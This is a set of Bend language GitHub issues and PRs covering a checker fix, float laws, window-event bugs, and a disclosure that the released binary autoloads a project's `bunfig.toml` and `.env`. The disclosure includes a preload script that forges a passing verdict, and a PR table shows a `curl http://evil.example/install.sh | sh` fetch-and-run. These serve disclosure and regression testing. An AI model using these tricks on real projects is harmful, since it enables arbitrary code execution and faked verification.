`term_compare` compared a constructor's fields inside `every()`, so comparing two `Succ` chains recursed once per unit and overflowed the checker's stack around 10^5:

```python
import Base

law big:
  {Nat.add(100000n, 100000n) == 200000n : Nat}

def big():
  {==}
```

On 2.0.26: `Error: the machine stack overflowed`. It checks at `1000n`; `Nat.mul(2n, 100000n)`, long lists and strings take the same path.

The `Ctr` case now walks the last field (a `Succ`'s predecessor, a list's tail, a word's bits) in a loop; the other fields recurse as before. `book_err` also catches an overflow raised while showing an error, since showing a false law about a huge term overflows too.

- the law above checks in 0.3 s; at `1000000n`, 0.7 s
- false laws are rejected with the same messages as before
- every file in `tests/*/*.bend` gives identical `--check-only` output on 2.0.26, same total time
- new test: `tests/check/nat_long_chain.bend`

AI-assisted; I read and approved every line. I know `bend.ts` is human-written, so rewrite it as you like; the repro and the test are the useful part.

title: Laws about F32 code: make float operations computable in the checker
body:
### What Bend should do

Let a law state and prove facts about float results:

```python
law sum_tenths:
  {F32.add(0.1, 0.2) == 0.3 : F32}   # true in binary32: both are 0x3E99999A
```

Today every `F32` operation in Base is an unfilled law, so this does not
check, and a user file cannot add axioms. Integer code has laws; float
code has none.

### What a library already gets

A float is `F32{Word(32n)}`, so functions of its bits compute in the
checker. A library uses that without any Base change:
<https://github.com/nbardy/bend_stdlib/tree/main/src/float>
(guide: [src/float/README.md](https://github.com/nbardy/bend_stdlib/blob/main/src/float/README.md)).
The hardware enters only as a named hypothesis, passed as a `~` argument.
It is on the hub, so trying it is one line:
`import bend-lawful-stdlib@0.1.0.0/src/float/f32.bend as F32`.

**Laws about game code.** [`apps/breakout.bend`](https://github.com/nbardy/bend_stdlib/blob/main/apps/breakout.bend)
keeps its paddle and ball in `F32` and moves them with Base's
`F32.add` and `F32.clamp`. Comparison and negation are specified on the
bits, and Base's `F32.clamp` is proven to stay in `[lo, hi]` for every
input, NaN and the infinities included. So, for every input list:

```python
law arena_run:
  for ~lt: F32.LtOk()          # the hardware's < is IEEE 754's
  for xs: List<&2, F32>        # mouse positions: any floats
  Arena(M.run(~Game, ~F32, ~step, init(), xs))
```

With NaN as the input on every step, the paddle sits at 216, the value
the proof says `F32.clamp(NaN, 0, 216)` returns. A second law,
`speed_run`, says the ball's speed never changes, bit for bit, because a
bounce is `F32.neg` (assuming `NegOk`).

**Laws that prevent backend divergence.** [`apps/fluid.bend`](https://github.com/nbardy/bend_stdlib/blob/main/apps/fluid.bend)
converts a back-traced position to an index with `F32.to_u32`, which is
undefined in C for NaN or out-of-range values, so the C and JS lanes
could disagree. A clamped `cell` step and its law `cell_ok` guarantee an
index in `[0, 95]` and a weight in `[0, 1]` for every float.

**Rounded arithmetic in the checker.** binary32 `add`, `sub`, `mul` in
software, as IEEE defines them (the exact result, then round to nearest
even), so a float fact closes by `{==}`:

```python
law add_rounds:
  {SF32.bits(SF32.add(0.1, 0.2)) == 1050253722 : U32}   # 0x3E99999A

def add_rounds():
  {==}
```

[`examples/sf32.bend`](https://github.com/nbardy/bend_stdlib/blob/main/examples/sf32.bend)
compares the software `add` and `mul`, and the bit-level comparison and
negation, with the hardware's on edge cases and 3000 random bit
patterns, on the C and JS lanes: 0 mismatches. It also found that the JS
lane does not keep a NaN's sign bit, so the negation hypothesis leaves
NaNs out.

### What only Base can do

Give the operations bodies while the compiler keeps the machine
instruction, as it already does for `U32.add` (`Word.adc` to the
checker, one instruction at run time). Then these laws need no
hypothesis. Two sizes:

1. **Exact operations first:** `F32.is_lt`, `is_le`, `is_eq`, `neg`,
   `abs`, whose results involve no rounding, so every backend agrees
   (NaN bits aside: #797, and the JS lane drops a NaN's sign). The bit-level definitions exist in
   [`src/float/f32.bend`](https://github.com/nbardy/bend_stdlib/blob/main/src/float/f32.bend).
   With these, `F32.min`, `max` and `clamp`, which Base already defines
   through `is_lt`, compute in the checker, and the breakout and fluid
   laws above need no assumption.
2. **Rounded operations:** `add`, `sub`, `mul`, `div`, `sqrt` as "exact,
   then round". They are correctly rounded on the C lane (contraction
   off) and the JS lane (`Math.fround` of a float64 result is the
   float32 result for these); Metal and CUDA would need checking.
   Transcendental functions would stay laws.

This is the step CompCert took in 1.12, replacing axiomatized floats with
Flocq's executable, proven IEEE model. Related work we drew on: VCFloat2
(Appel, Kellison), Numerical Fuzz (Kellison, Hsu), Bean. Design notes:
<https://github.com/nbardy/bend_stdlib/blob/main/notes/float_system.md>.

Is this something you want in Base, somewhere else, or left to
libraries? The library works as it is either way.

(Written with AI assistance; I read and approved it.)

title: The released `bend` binary runs `bunfig.toml` `preload` from the working directory, so checking a project can run its code and fake the verdict
body:
### What I did

The release archive's `bin/bend` is a Bun standalone executable (`bend-2.0.26-darwin-arm64.tar.gz`, sha256 `a340f4f0…` as in `flake.nix`; Bun v1.4.0). With the default build options, a Bun executable loads `bunfig.toml` from the current directory at startup and runs its `preload` scripts before `bend`'s own code. The Homebrew formula and the Nix flake install the same archive.

A directory with a false law:

`LAWS.bend`

```bend
import Base

law false_law:
  {1n == 0n : Nat}
```

`PROOF.bend`

```bend
import Base
import ./LAWS.bend as Laws

def Laws.false_law():
  {==}
```

and two more files the project can ship next to them:

`bunfig.toml`

```toml
preload = ["./.p.ts"]
```

`.p.ts`

```ts
const fs = require("fs");
const ws = fs.writeSync;
fs.writeSync = (fd: number, s: any, ...r: any[]) => fd === 2 ? 0 : ws(fd, s, ...r);
const exit = process.exit.bind(process);
(process as any).exit = (c?: number) => {
  if (c || process.exitCode) { ws(1, "All terms check.\n"); process.exitCode = 0; }
  exit(0);
};
```

### What happened

Without `bunfig.toml`:

```text
$ bend PROOF.bend
Error:
- expected : 1n
- observed : 0n
...
$ echo $?
1
```

With it, in the same directory:

```text
$ bend PROOF.bend
All terms check.
$ echo $?
0
```

`bend PROOF.bend --check-only` behaves the same way. A preload that only writes a marker file shows that it runs for any file passed to `bend`, including a plain `main.bend`. The script is ordinary TypeScript with full access to the machine.

The same autoloading also reads `.env` (see the comment on #1005: a project can point `BEND_LIB` at unverified copies of hub packages). The released binary does this too: the `.env` repro from #1005 prints `All terms check.` with it.

### Why it matters

- **The verdict can be forged.** In the LAWS/PROOF workflow, the side that writes PROOF.bend can also add `bunfig.toml` and a hidden script, and `bend PROOF.bend` then reports success and exits 0 for any laws. CI that runs `bend PROOF.bend` in the checked-out tree is affected in the same way.
- **Checking runs the project's code.** Running `bend` on a project you do not trust (to check it, not to run it) executes arbitrary code from that project with the user's permissions. Nothing in Bend itself does this: the checker never runs IO, so users have no reason to expect it.

### Expected behavior

`bend` should not read Bun configuration from the directory it is run in. Bun has build flags for this: `bun build --compile --no-compile-autoload-bunfig --no-compile-autoload-dotenv` (and, for completeness, `--no-compile-autoload-package-json --no-compile-autoload-tsconfig`), or the matching `autoloadBunfig: false` / `autoloadDotenv: false` in `Bun.build`'s `compile` options. The build lives in `release.ts` in the bend-lang.com repo, so I could not test the fixed binary myself.

Running `bun bend2/main.ts` from a checkout has the same problem with `bunfig.toml` and `.env` in the working directory. That is less common for users, but the guide or README could mention it.

### Version

```text
bend 2.0.26 (release archive bend-2.0.26-darwin-arm64.tar.gz)
Bun v1.4.0 (embedded)
Darwin arm64
```

title: Window: `Key` events never carry an uppercase letter, so a program cannot tell what the user typed
body:
### What you did

Opened a window and typed `Shift+a`, then `Shift+1`, printing every `Key` event.

### What happened

| typed | `Key.code` of the letter or digit key |
| --- | --- |
| `Shift+a` | `97` (`a`), after a separate Shift event (`65592`) |
| `Shift+1` | `33` (`!`), after a separate Shift event (`65592`) |

`Shift+1` arrives as `!` (33), but `Shift+a` arrives as `a` (97), never `A` (65).

Both backends drop the case on purpose:

- macOS, [`window_open.c#L40`](https://github.com/bendlang/bend/blob/6a77e1246c351055cb15031267a7c76c87036cbc/bend2/effs/window_open.c#L40):
  `[ev.charactersIgnoringModifiers lowercaseString]`.
  `charactersIgnoringModifiers` already applies Shift, so symbols come out shifted; `lowercaseString` then undoes it for letters only.
- Linux, [`window_frame.c#L231`](https://github.com/bendlang/bend/blob/6a77e1246c351055cb15031267a7c76c87036cbc/bend2/effs/window_frame.c#L231):
  `XLookupString` runs with `ShiftMask | LockMask`, then `'A'..'Z'` is mapped back to `'a'..'z'`.

So `code` is neither a physical key (Shift changes `1` into `!`) nor the typed character (Shift does not change `a` into `A`).
A text field has to track Shift itself and rebuild the case, and Caps Lock is lost entirely.

### What would help

If `Key.code` is meant to name the key, keeping it that way is fine. What is missing is the character the user typed.
A separate event, e.g. `Text{text: String}`, sent on key-down with the text the OS produces (Shift, Caps Lock and the keyboard layout applied), would cover text input without changing `Key`.
On macOS that is `ev.characters`; on Linux, the string `XLookupString` already returns before the case is folded.

The same event would also be the natural place for input-method text (see #1022).

Seen on Bend 2.0.5, macOS. The same code is still on `main` (6a77e12, v2.0.26); links point there. The Linux path was read from the source, not run.

title: Window: no scroll events (macOS ignores `scrollWheel:`, Linux drops buttons 4-7)
body:
### What you did

Opened a window and turned the mouse wheel / swiped two fingers on a trackpad over it.

### What happened

No event reaches the program. `Event` has no variant for it:

```python
type Event is Data:
  Key{code: U32, down: Bool}
  Mouse{x: U32, y: U32, button: U32, down: Bool}
  Move{x: U32, y: U32}
  Close{}
```

- macOS: `BendView` in [`window_open.c`](https://github.com/bendlang/bend/blob/6a77e1246c351055cb15031267a7c76c87036cbc/bend2/effs/window_open.c) does not implement `scrollWheel:`.
- Linux: X11 reports the wheel as buttons 4-7, and [`window_frame.c#L260`](https://github.com/bendlang/bend/blob/6a77e1246c351055cb15031267a7c76c87036cbc/bend2/effs/window_frame.c#L260) keeps only `b >= 1 && b <= 3`.

Any app with a list or a canvas larger than the window has to fall back to keys or click-and-drag to scroll.

### What would help

An event carrying the pointer position and a signed delta, e.g. `Scroll{x: U32, y: U32, dx: F32, dy: F32}`. `F32` keeps the sign and the fractional trackpad deltas.
On macOS, `scrollingDeltaX/Y` (with `hasPreciseScrollingDeltas` for trackpads); on Linux, one step per button 4/5 (vertical) and 6/7 (horizontal).

Seen on Bend 2.0.5, macOS. The same code is still on `main` (6a77e12, v2.0.26); links point there. The Linux path was read from the source, not run.

title: Window: the window cannot be resized, and the program is never told its size
body:
### What you did

Opened a window with `App.run` and tried to drag its edge or corner.

### What happened

The window keeps its size.

- macOS, [`window_open.c#L149-L150`](https://github.com/bendlang/bend/blob/6a77e1246c351055cb15031267a7c76c87036cbc/bend2/effs/window_open.c#L149-L150): the style mask is `Titled | Closable | Miniaturizable`, without `NSWindowStyleMaskResizable`.
- Linux, [`window_open.c#L226`](https://github.com/bendlang/bend/blob/6a77e1246c351055cb15031267a7c76c87036cbc/bend2/effs/window_open.c#L226): `XSizeHints` sets `PMinSize | PMaxSize` to the opening size.

The size is fixed by `Window.open(title, width, height)`, and `Event` has nothing that would report a new one.
For tools with side panels (an editor, a viewer), a fixed window is the main usability limit.

### What would help

1. A way to open a resizable window (a flag, or a separate `Window.open_resizable`).
2. An event such as `Resize{width: U32, height: U32}` when the drawable area changes, so `view` can return an image of the new size.
3. On macOS, `drawableSize` following the view's bounds (times `backingScaleFactor`), and on Linux, reacting to `ConfigureNotify`.

Related: #923 (full screen) needs the same size-change plumbing.

Seen on Bend 2.0.5, macOS. The same code is still on `main` (6a77e12, v2.0.26); links point there. The Linux path was read from the source, not run.

title: Window: no input-method (IME) support, so Korean, Japanese and Chinese text cannot be typed
body:
### What you did

Switched the macOS input source to Korean (2-Set) and typed `ㅎ ㅏ ㄴ` into a Bend window, expecting `한`.

### What happened

The program gets one `Key` event per physical key and nothing else.
The input method never composes the jamo, so the syllable `한` never reaches the program.

- macOS: `BendView` receives `keyDown:` directly and does not adopt `NSTextInputClient` or call `interpretKeyEvents:`,
  so the text input system never sees the keys.
- Linux: [`window_frame.c`](https://github.com/bendlang/bend/blob/6a77e1246c351055cb15031267a7c76c87036cbc/bend2/effs/window_frame.c) uses `XLookupString`. It has no `XIM`/`XIC` and no `Xutf8LookupString`.

This blocks any program whose users write in a language that needs an input method.

### What would help

Two events next to `Key`:

- `Text{text: String}` for committed text (the same event proposed in #1019),
- `Compose{text: String}` for the text still being composed (marked text), so the program can draw it where the caret is; empty when composition ends.

On macOS: adopt `NSTextInputClient` in `BendView`, call `[self interpretKeyEvents:@[ev]]` from `keyDown:`, send `Text` from `insertText:replacementRange:` and `Compose` from `setMarkedText:selectedRange:replacementRange:`.
`firstRectForCharacterRange:` needs a caret position, which could be set with a small `Window.set_caret(x, y)` effect so the candidate window appears in the right place.
On Linux: open an `XIM`, create an `XIC`, and use `Xutf8LookupString`.

Seen on Bend 2.0.5, macOS. The same code is still on `main` (6a77e12, v2.0.26); links point there. The Linux path was read from the source, not run.

title: The ping gate checks that the released bend ignores a project's bunfig.toml and .env
body:
The gate and docs half of #1018. The fix is in the site repo's `release.ts` (bendlang-private/bend-lang.com#37): it builds `bin/bend` with `--no-compile-autoload-{bunfig,dotenv,package-json,tsconfig}`, so the compiled bend no longer reads a project's `bunfig.toml` or `.env`.

## Changes

- **`gates/ping.ts`:** the installed `bend` runs `main.bend` in a project containing:
  - a `bunfig.toml` whose `preload` writes a marker file;
  - a `.env` with `BEND_LIB=./lib`, where `lib/` holds both a `names/bend-ping-probe@1.0.0.0` mapping and the package it points to. This is point 3 of the comment: a named import where the project supplies the mapping and the package.

  The check requires that no marker is written and that the name is looked up on the hub, which fails.
  - with #37: `PASS: 21 / 21`;
  - with the site repo's `origin/main` build (no flags): that check fails, and bend prints `5n` from the project's copy.
- **`README.md`:** one sentence under Install: the installed `bend` ignores a project's `bunfig.toml` and `.env`, but `bun bend2/main.ts` from a checkout still reads them, so check untrusted code with `bend`. Code in `main.ts` can't prevent this, because a preload runs before it. The README is at its token cap, so the note is short.

## The other effects in the comment

Each was checked against a build without the flags and one with them (Bun 1.4.0):

| `.env` in the project | Without the flags | With the flags |
|---|---|---|
| `BEND_HUB=<local server>`, then `--publish <name>@<version>` | the server gets `Authorization: Bearer <key>` | nothing reaches it |
| `BEND_ORIGIN=http://evil.example`, then `bend update` (fake `curl` on PATH) | `curl -fsSL http://evil.example/install.sh \| sh` | `https://bend-lang.com/install.sh` |
| `BEND_LIB=./.cache` with `names/` and the package | `All terms check.` for a law about the project's copy | the name is asked of the hub |

All three need the variable to come from `.env`, and the release no longer reads it. What stays open from #1005 (a cached package isn't re-hashed on load, and the `../0x…` namespace collision) is in `bend.ts` and isn't part of this PR.

The release gets the fix only when 2.0.27 is cut from #37's `release.ts`.

🤖 Generated with [Claude Code](https://claude.com/claude-code)
